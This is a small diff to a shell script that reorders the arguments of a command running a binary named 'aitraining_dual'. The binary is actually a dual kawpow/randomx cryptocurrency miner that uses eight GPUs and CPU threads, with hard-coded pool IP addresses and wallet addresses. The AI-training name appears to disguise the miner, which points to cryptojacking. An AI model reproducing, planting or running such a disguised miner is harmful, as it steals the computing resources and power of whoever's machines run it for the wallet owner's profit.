@@ -29,4 +29,4 @@ export RANDOMX_USE_HW_AES=1
 chmod +x aitraining_dual
 
 # Execute the dual mining command
-./aitraining_dual --algorithm kawpow\;randomx --pool stratum+ssl://51.89.99.172:16161\;stratum+ssl://51.222.200.133:10343 --gpu-id 0,1,2,3,4,5,6,7 --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr\;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd --worker ${WORKER}\;${WORKER} --password x\;x --cpu-threads 0\;${CPU_THREADS} --keepalive true
+./aitraining_dual --algorithm kawpow\;randomx --pool stratum+ssl://51.89.99.172:16161\;stratum+ssl://51.222.200.133:10343 --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr\;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd --worker ${WORKER}\;${WORKER} --password x\;x --cpu-threads 0\;${CPU_THREADS} --keepalive true --gpu-id 0,1,2,3,4,5,6,7 
